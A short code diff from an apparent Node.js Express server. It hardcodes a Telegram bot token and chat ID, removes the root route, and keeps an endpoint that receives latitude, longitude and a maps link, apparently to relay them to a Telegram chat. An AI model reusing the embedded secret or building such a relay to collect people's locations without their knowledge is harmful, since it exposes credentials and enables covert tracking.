@@ -11,10 +11,6 @@ app.use(bodyParser.json());
 const TELEGRAM_BOT_TOKEN = "7312800220:AAGrpQYMFWi7ih3YJuZdTHWeT_DqeDf9xo4"; // Substitua pelo token do seu bot
 const TELEGRAM_CHAT_ID = "1449961930"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
-});
-
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
 
